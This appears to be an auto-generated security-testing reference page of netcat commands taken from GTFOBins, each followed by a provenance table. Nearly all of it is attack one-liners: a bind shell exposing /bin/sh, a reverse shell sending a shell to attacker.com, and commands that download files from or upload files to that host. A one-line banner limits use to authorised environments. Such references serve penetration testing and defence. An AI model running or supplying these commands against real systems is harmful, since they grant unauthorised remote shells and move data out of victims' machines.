---
parsed_by: focuslocust
source: commands
type: generated
---
# nc Commands

[Home](../../../README.md)

> This page contains security testing commands. Use only in authorised environments.

## nc

Tool page: [nc](../../tools/linux/nc.md)

### bind-shell

```text
nc -l -p 12345 -e /bin/sh
```

Provenance:

| Field | Value |
| --- | --- |
| Source | `gtfobins` |
| Source file | `/home/adams/scorchederf/focuslocust/.cache/gtfobins/_gtfobins/nc` |
| Evidence | Function example preserved from source parser. |

### download

```text
nc -l -p 12345 >/path/to/output-file
```

Provenance:

| Field | Value |
| --- | --- |
| Source | `gtfobins` |
| Source file | `/home/adams/scorchederf/focuslocust/.cache/gtfobins/_gtfobins/nc` |
| Evidence | Function example preserved from source parser. |

### download

```text
nc attacker.com 12345 >/path/to/output-file
```

Provenance:

| Field | Value |
| --- | --- |
| Source | `gtfobins` |
| Source file | `/home/adams/scorchederf/focuslocust/.cache/gtfobins/_gtfobins/nc` |
| Evidence | Function example preserved from source parser. |

### reverse-shell

```text
nc -e /bin/sh attacker.com 12345
```

Provenance:

| Field | Value |
| --- | --- |
| Source | `gtfobins` |
| Source file | `/home/adams/scorchederf/focuslocust/.cache/gtfobins/_gtfobins/nc` |
| Evidence | Function example preserved from source parser. |

### upload

```text
nc -l -p 12345 </path/to/input-file
```

Provenance:

| Field | Value |
| --- | --- |
| Source | `gtfobins` |
| Source file | `/home/adams/scorchederf/focuslocust/.cache/gtfobins/_gtfobins/nc` |
| Evidence | Function example preserved from source parser. |

### upload

```text
nc attacker.com 12345 </path/to/input-file
```

Provenance:

| Field | Value |
| --- | --- |
| Source | `gtfobins` |
| Source file | `/home/adams/scorchederf/focuslocust/.cache/gtfobins/_gtfobins/nc` |
| Evidence | Function example preserved from source parser. |
